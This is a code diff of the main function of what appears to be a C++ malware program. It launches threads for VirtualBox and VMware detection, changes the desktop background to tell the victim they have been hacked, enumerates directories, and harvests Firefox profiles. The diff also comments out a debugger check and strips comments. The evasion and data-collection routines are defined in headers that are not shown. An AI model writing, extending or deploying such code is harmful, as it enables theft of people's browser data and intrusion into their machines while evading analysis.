@@ -3,12 +3,13 @@
 #include "Victim.h"
 #include "VMEscape.h"
 #include "Misc.h"
+#include <filesystem>
 
 int main(int argc, char* argv[]) {
 #ifndef _DEBUG
-	if (IsDebuggerPresent()) {
-			exit(EXIT_FAILURE);
-		}
+	//	if (IsDebuggerPresent()) {
+	//		exit(EXIT_FAILURE);
+	//	}
 	HWND hWindowConsole;
 	AllocConsole();
 	hWindowConsole = FindWindowA("ConsoleWindowClass", NULL);
@@ -21,12 +22,10 @@ int main(int argc, char* argv[]) {
 	std::thread tBackgroundChange(SCH::LockBackground);
 	std::thread t_DirectoriesEnum(&Victim::GetDirectoryList, CurrentComputer);
 	std::thread t_GetFirefoxProfiles(&Victim::GetFirefoxProfiles, CurrentComputer);
-	virtualBoxChange.join(); //VMEscape check on virtualBox
-	VMWareBoxChange.join(); //VMEscape check on VMWare
-	tBackgroundChange.join(); //Change Background to let the user knows he has been hacked... (This one eventually will become optional)
-	t_DirectoriesEnum.join(); //Directories enumeration
-	
-	//After all the beginning we can start enumerating FirefoxProfiles
+	virtualBoxChange.join();
+	VMWareBoxChange.join();
+	tBackgroundChange.join();
+	t_DirectoriesEnum.join();
 	CurrentComputer->GetFirefoxProfiles();
 	t_GetFirefoxProfiles.join();
 }
